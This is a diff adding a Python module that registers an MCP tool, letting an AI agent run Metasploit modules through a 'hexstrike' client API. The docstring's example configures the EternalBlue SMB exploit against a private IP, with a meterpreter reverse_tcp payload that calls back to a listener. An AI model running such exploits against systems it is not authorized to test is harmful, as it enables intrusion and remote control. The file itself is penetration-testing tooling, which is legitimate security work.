+++ mcp_tools/exploit_framework/metasploit.py
@@ -1,0 +1,47 @@
+# mcp_tools/exploit_framework/metasploit.py
+
+from typing import Dict, Any
+
+def register_metasploit_tool(mcp, hexstrike_client, logger):
+    @mcp.tool()
+    def metasploit_run(module: str, options: Dict[str, Any] = {}) -> Dict[str, Any]:
+        """
+        Execute a Metasploit module with enhanced logging.
+
+        Args:
+            module: The Metasploit module to use (e.g., "exploit/windows/smb/ms17_010_eternalblue").
+            options: Dictionary of module options. Required options depend on the module type:
+                - For exploits: Common required options include 'RHOST', 'RPORT', 'PAYLOAD', etc.
+                - For auxiliary modules: Options may include 'TARGET', 'THREADS', etc.
+                - For post modules: Options depend on the session and target.
+
+        Returns:
+            Metasploit execution results.
+
+        Example:
+            metasploit_run(
+                module="exploit/windows/smb/ms17_010_eternalblue",
+                options={
+                    "RHOST": "192.168.1.10",
+                    "RPORT": 445,
+                    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp",
+                    "LHOST": "192.168.1.100",
+                    "LPORT": 4444
+                }
+            )
+
+        Note:
+            Refer to Metasploit module documentation for the full list of required and optional parameters.
+            All required options must be provided in the 'options' dictionary for successful execution.
+        """
+        data = {
+            "module": module,
+            "options": options
+        }
+        logger.info(f"🚀 Starting Metasploit module: {module}")
+        result = hexstrike_client.safe_post("api/tools/metasploit", data)
+        if result.get("success"):
+            logger.info(f"✅ Metasploit module completed: {module}")
+        else:
+            logger.error(f"❌ Metasploit module failed: {module}")
+        return result
